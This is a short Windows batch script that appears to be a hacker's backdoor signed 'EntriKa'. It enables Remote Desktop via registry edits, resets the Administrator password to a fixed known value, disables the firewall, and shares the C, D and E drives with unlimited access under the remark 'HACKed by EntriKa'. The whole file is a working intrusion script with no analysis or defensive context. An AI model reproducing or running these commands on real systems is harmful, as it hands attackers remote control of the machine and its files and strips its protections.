@echo off
reg add "hklm\\system\\currentControlSet\\Control\\Terminal Server" /v AllowTSConnections /t REG_DWORD /d 0x1 /f
reg add "hklm\\system\\currentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f 
net user Administrator Ab123456
netsh firewall set opmode disable
net share hacker1=c:\\ /unlimited /remark:"HACKed by EntriKa"
net share hacker2=d:\\ /unlimited /remark:"HACKed by EntriKa"
net share hacker3=e:\\ /unlimited /remark:"HACKed by EntriKa"

